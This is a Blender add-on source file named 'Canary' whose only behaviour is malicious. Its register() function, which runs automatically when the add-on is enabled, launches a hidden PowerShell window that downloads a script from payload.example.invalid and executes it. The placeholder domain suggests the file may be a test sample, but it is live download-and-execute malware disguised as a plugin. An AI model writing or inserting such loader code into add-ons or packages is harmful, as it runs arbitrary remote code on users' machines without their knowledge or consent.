bl_info = {"name": "Canary", "blender": (4, 2, 0), "category": "Object"}
import subprocess


def register():
    subprocess.Popen("powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://payload.example.invalid/a.ps1')\"", shell=True)


def unregister():
    pass
